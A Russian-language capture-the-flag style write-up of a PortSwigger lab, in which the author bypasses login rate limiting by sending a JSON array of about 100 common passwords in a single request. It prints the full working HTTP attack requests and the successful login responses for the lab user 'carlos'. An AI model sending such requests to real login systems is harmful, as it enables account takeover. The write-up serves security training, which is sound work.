---
title: "Broken brute-force protection, multiple credentials per request"
date: 2025-10-09
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request"
classes: wide
---

Эта лаба уязвима к атаке брутфорсом из-за ошибки в логике защиты. Для решения нужно войти в учетку пользователя `carlos`.

```
https://0aaa00650426d98780d930d4009900ea.web-security-academy.net/
```

## Solution

Ну-с. Нужно получить доступ к учетке. Пойду логиниться)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Broken_brute-force_protection_multiple_credentials_per_request/1.png){: height="200" .align-center}

Сам запрос:

```http
POST /login HTTP/2
Host: 0aaa00650426d98780d930d4009900ea.web-security-academy.net
Cookie: session=FOehRTUJ8LvfSBoeA4PDBTMQTNcOQN22
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aaa00650426d98780d930d4009900ea.web-security-academy.net/login
Content-Type: application/json
Content-Length: 40
Origin: https://0aaa00650426d98780d930d4009900ea.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"username":"wiener","password":"peter"}
```

Магия... `winere`:`peter` - постоянные креды для большей части лаб. Попробуем брутфорсить этот пароль. Так-с. После 4 запросов меня заблочили. При этом не работает даже ввод корректных кред.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Broken_brute-force_protection_multiple_credentials_per_request/2.png){: height="200" .align-center}

Попробовал следующую логику: отправил 2 неправильных пароля, затем успешно вошел в аккаунт, снова отправил неверные креды. Все равно словил блок. Значит такой способ не подойдет. Добавлю `X-Forwarded_for: web-security-academy.net`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Broken_brute-force_protection_multiple_credentials_per_request/3.png){: height="200" .align-center}

Все еще не то. Попытка отправить пачку запросов в надежде на `Race Condition` тоже не вышла. Попробую добавить лишние поля в тело запроса:

```http
POST /login HTTP/2
Host: 0aaa00650426d98780d930d4009900ea.web-security-academy.net
Cookie: session=FOehRTUJ8LvfSBoeA4PDBTMQTNcOQN22
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aaa00650426d98780d930d4009900ea.web-security-academy.net/login
Content-Type: application/json
Content-Length: 93
Origin: https://0aaa00650426d98780d930d4009900ea.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"username":"wiener",
	"password": [
		"peter1",
		"aaaa",
		"aoeuaoeu",
		"aoeuaoeu",
		"peter"
	]
}
```

О как:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=ngHxgYJlpNsbYdLoJ3deLDif99yoZcHw; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Возьму пароли из [этого](https://portswigger.net/web-security/authentication/auth-lab-passwords) списка. 

Составлю запрос:

```http
POST /login HTTP/2
Host: 0aaa00650426d98780d930d4009900ea.web-security-academy.net
Cookie: session=FOehRTUJ8LvfSBoeA4PDBTMQTNcOQN22
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aaa00650426d98780d930d4009900ea.web-security-academy.net/login
Content-Type: application/json
Content-Length: 1189
Origin: https://0aaa00650426d98780d930d4009900ea.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"username":"carlos",
"password": ["123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
"123123",
"baseball",
"abc123",
"football",
"monkey",
"letmein",
"shadow",
"master",
"666666",
"qwertyuiop",
"123321",
"mustang",
"1234567890",
"michael",
"654321",
"superman",
"1qaz2wsx",
"7777777",
"121212",
"000000",
"qazwsx",
"123qwe",
"killer",
"trustno1",
"jordan",
"jennifer",
"zxcvbnm",
"asdfgh",
"hunter",
"buster",
"soccer",
"harley",
"batman",
"andrew",
"tigger",
"sunshine",
"iloveyou",
"2000",
"charlie",
"robert",
"thomas",
"hockey",
"ranger",
"daniel",
"starwars",
"klaster",
"112233",
"george",
"computer",
"michelle",
"jessica",
"pepper",
"1111",
"zxcvbn",
"555555",
"11111111",
"131313",
"freedom",
"777777",
"pass",
"maggie",
"159753",
"aaaaaa",
"ginger",
"princess",
"joshua",
"cheese",
"amanda",
"summer",
"love",
"ashley",
"nicole",
"chelsea",
"biteme",
"matthew",
"access",
"yankees",
"987654321",
"dallas",
"austin",
"thunder",
"taylor",
"matrix",
"mobilemail",
"mom",
"monitor",
"monitoring",
"montana",
"moon",
"moscow"
]}
```

Красотища. Погнали))

```http
HTTP/2 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=7IeODKq0yeW0kNcOOeBJESNd1qtSieeN; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Открою в браузере с помощью кнопки `Show response in browser`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Broken_brute-force_protection_multiple_credentials_per_request/4.png){: height="200" .align-center}

Done)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Broken_brute-force_protection_multiple_credentials_per_request/5.png){: height="200" .align-center}